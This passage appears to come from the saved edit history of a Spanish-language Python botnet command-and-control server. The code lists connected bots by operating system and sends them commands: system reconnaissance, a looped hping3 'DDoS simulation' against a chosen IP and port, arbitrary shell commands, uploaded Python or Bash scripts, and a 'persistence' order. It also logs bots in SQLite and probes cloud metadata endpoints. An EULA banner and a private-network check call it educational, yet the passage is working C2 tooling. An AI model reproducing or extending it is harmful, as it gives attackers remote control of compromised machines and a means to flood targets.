hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione el tipo de comandos:\")\r\n+        print(\"1. Comandos b谩sicos\")\r\n+        print(\"2. Comandos avanzados\")\r\n+        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            print(\"\\nComandos b谩sicos disponibles:\")\r\n+            print(\"1. Obtener informaci贸n del sistema\")\r\n+            print(\"2. Consultar conexiones de red\")\r\n+            print(\"3. Ver procesos en ejecuci贸n\")\r\n+            print(\"4. Listar archivos en el directorio actual\")\r\n+            print(\"5. Obtener la IP p煤blica\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            print(\"\\nComandos avanzados disponibles:\")\r\n+            print(\"1. Simular ataque DDoS\")\r\n+            print(\"2. Detener simulaci贸n de DDoS\")\r\n+            print(\"3. Ejecutar un comando personalizado\")\r\n+            print(\"4. Ejecutar un script remoto\")\r\n+            print(\"5. Intentar asegurar la persistencia\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n+                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n+                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    print(\"Protocolo no v谩lido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n+                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                print(\"Seleccione el tipo de script:\")\r\n+                print(\"1. Python\")\r\n+                print(\"2. Bash\")\r\n+                print(\"3. Otro (especificar)\")\r\n+                \r\n+                tipo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n+                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n+                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n+                print(\"1. Escribirlo aqu铆\")\r\n+                print(\"2. Proporcionar la ruta de un archivo\")\r\n+                \r\n+                metodo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if metodo == \"1\":\r\n+                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        try:\r\n+                            linea = input()\r\n+                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n+                                break\r\n+                            lineas.append(linea)\r\n+                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n+                            print(\"\\nEntrada cancelada.\")\r\n+                            return\r\n+                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        print(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot espec铆fico\")\r\n+        print(\"5. Lista de bots espec铆ficos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opci贸n: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no v谩lido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n+\r\n+    :param bot: El socket del bot al que se enviar谩 el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots():\r\n+    \r\n+    \"\"\"\r\n+    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n+    los bots conectados.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        listar_bots()\r\n+        \r\n+        try:\r\n+            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n+        except ValueError:\r\n+            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot: # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close() # Cerrar la conexi贸n\r\n+            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot) # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot] # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n+\r\n+        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n+\r\n+def cargar_configuracion():\r\n+    \r\n+    \"\"\"\r\n+    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n+    en el directorio \"config\" del proyecto.\r\n+\r\n+    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n+        * BASE_DIR: Directorio base del proyecto.\r\n+        * HOST: Direcci贸n IP del servidor.\r\n+        * PORT: Puerto de escucha del servidor.\r\n+        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n+        * DB_PATH: Ruta del archivo de la base de datos.\r\n+        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n+        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n+        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n+        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n+\r\n+    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n+    se muestra un mensaje de error y se sale del programa con un estado de\r\n+    error.\r\n+\r\n+    :return: Un objeto con la configuraci贸n cargada.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cargando configuraci贸n del servidor\")\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n+        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n+\r\n+        if not os.path.exists(CONFIG_PATH):\r\n+            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n+\r\n+        config = configparser.ConfigParser()\r\n+        config.read(CONFIG_PATH)\r\n+\r\n+        return {\r\n+            \"BASE_DIR\": BASE_DIR,\r\n+            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n+            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n+            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n+            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n+            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n+            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n+            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n+            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+        }\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n+        exit(1)\r\n+\r\n+def iniciar_servidor():\r\n+    \"\"\"\r\n+    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n+    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n+\r\n+    Luego, inicializa la base de datos, configura el sistema de logging y\r\n+    lanza el servidor de C2.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n+        if not esRedPrivada(config[\"HOST\"]):\r\n+            input(\"[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.\")\r\n+            sys.exit(1)\r\n+        verificar_eula(\"servidor\")\r\n+        init_db(config[\"DB_PATH\"])\r\n+        servidor_CnC(config[\"HOST\"], config[\"PORT\"])\r\n+        logging.info(\"Servidor de Comando y Control (C2) iniciado correctamente\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al iniciar el servidor: {e}\")\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        iniciar_servidor()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en la ejecuci贸n principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740220160860,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,876 @@\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import requests\r\n+import sqlite3\r\n+import configparser\r\n+from datetime import datetime\r\n+\r\n+bots = [] # List de bots\r\n+bot_ids = {} # Diccinario con los IDS de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n+ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n+server_running = True  # Variable para controlar el estado del servidor\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"\r\n+    Configura el sistema de logging del servidor.\r\n+\r\n+    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n+    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n+    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n+\r\n+    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n+    La ruta se crea si no existe.\r\n+\r\n+    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n+\r\n+    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        log_level = config[\"LOG_LEVEL\"].upper()\r\n+        log_file = config[\"SERVER_LOG_FILE\"]\r\n+\r\n+        log_levels = {\r\n+            \"DEBUG\": logging.DEBUG,\r\n+            \"INFO\": logging.INFO,\r\n+            \"WARNING\": logging.WARNING,\r\n+            \"ERROR\": logging.ERROR,\r\n+            \"CRITICAL\": logging.CRITICAL\r\n+        }\r\n+        log_level = log_levels.get(log_level, logging.INFO)\r\n+\r\n+        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n+\r\n+        logging.basicConfig(\r\n+            level=log_level,\r\n+            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+            handlers=[\r\n+                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n+                logging.StreamHandler(sys.stdout)\r\n+            ]\r\n+        )\r\n+\r\n+        logging.info(\"Sistema de logging configurado correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al configurar el logging: {e}\")\r\n+\r\n+# Inicializar la base de datos\r\n+def init_db(DB_PATH):\r\n+    \"\"\"\r\n+    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n+\r\n+    Crea la carpeta y el archivo de la base de datos si no existe,\r\n+    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n+\r\n+    :param DB_PATH: La ruta del archivo de la base de datos.\r\n+    :type DB_PATH: str\r\n+    \"\"\"\r\n+    try:\r\n+        db_dir = os.path.dirname(DB_PATH)\r\n+        if not os.path.exists(db_dir):\r\n+            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n+\r\n+        conn = sqlite3.connect(DB_PATH)\r\n+        cursor = conn.cursor()\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            identificador TEXT UNIQUE,\r\n+                            ip TEXT,\r\n+                            hostname TEXT,\r\n+                            os TEXT,\r\n+                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n+                        )''')\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            bot_id INTEGER,\r\n+                            respuesta TEXT,\r\n+                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n+                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n+                        )''')\r\n+\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(\"Base de datos inicializada correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n+\r\n+def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n+    \"\"\"\r\n+    Agrega una respuesta de un bot a la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n+    :type bot_id: int\r\n+    :param respuesta: La respuesta del bot.\r\n+    :type respuesta: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n+\r\n+def detectarEntornoCloud():\r\n+    \r\n+    \"\"\"\r\n+    Detecta si el entorno actual es un entorno de cloud computing.\r\n+\r\n+    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n+    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n+    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n+    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n+    se devuelve False.\r\n+\r\n+    Returns:\r\n+        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n+    \"\"\"\r\n+    try:\r\n+        try:\r\n+            # AWS Metadata\r\n+            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        try:\r\n+            # Google Cloud Metadata\r\n+            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        return False\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n+        return False\r\n+\r\n+def esRedPrivada(ip):\r\n+    \"\"\"Indica si una IP es de una red privada o no.\r\n+\r\n+    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n+    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n+    devuelve False.\r\n+\r\n+    Parameters:\r\n+    ip (str): La IP a verificar.\r\n+\r\n+    Returns:\r\n+    bool: True si la IP es de una red privada, False si no lo es.\r\n+    \"\"\"\r\n+    try:\r\n+        result = ipaddress.ip_address(ip).is_private\r\n+        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n+        return result\r\n+    except ValueError as e:\r\n+        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n+        return False\r\n+\r\n+def verificar_eula(tipo):\r\n+    \"\"\"\r\n+    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n+    \r\n+    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n+    \"\"\"\r\n+    try:\r\n+        if tipo not in [\"servidor\", \"cliente\"]:\r\n+            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n+\r\n+        # Ruta para el archivo EULA en la carpeta docs\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n+\r\n+        # Si no existe, lo crea\r\n+        if not os.path.exists(eula_path):\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=False\")\r\n+\r\n+        # Leer si ya acept贸\r\n+        with open(eula_path, \"r\") as f:\r\n+            for linea in f:\r\n+                if \"ACCEPTED=True\" in linea:\r\n+                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+                    return True\r\n+\r\n+        # Mostrar Acuerdo de Licencia\r\n+        print(\"\\n\" + \"=\"*50)\r\n+        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n+        print(\"=\"*50)\r\n+        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n+        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n+        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n+        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n+        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n+        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n+        \r\n+        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n+        print(\"   - Usarlo con intenciones maliciosas.\")\r\n+        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n+        print(\"   - Modificarlo para evadir restricciones.\")\r\n+        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n+        \r\n+        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n+        \r\n+        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n+        \r\n+        if respuesta == \"ACEPTO\":\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=True\")\r\n+            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+            return True\r\n+        else:\r\n+            print(\"Debe aceptar la licencia para usar este software.\")\r\n+            exit()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al verificar el EULA: {e}\")\r\n+        exit()\r\n+\r\n+def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n+    \"\"\"\r\n+    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param identificador: El identificador 煤nico del bot.\r\n+    :type identificador: str\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    :param hostname: El nombre del host del bot.\r\n+    :type hostname: str\r\n+    :param os: El sistema operativo del bot.\r\n+    :type os: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n+        bot = cursor.fetchone()\r\n+        if bot:\r\n+            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n+            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        else:\r\n+            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n+            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        conn.commit()\r\n+        conn.close()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def actualizar_bot_en_db(config, ip):\r\n+    \"\"\"\r\n+    Actualiza la 煤ltima vez visto de un bot en la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | 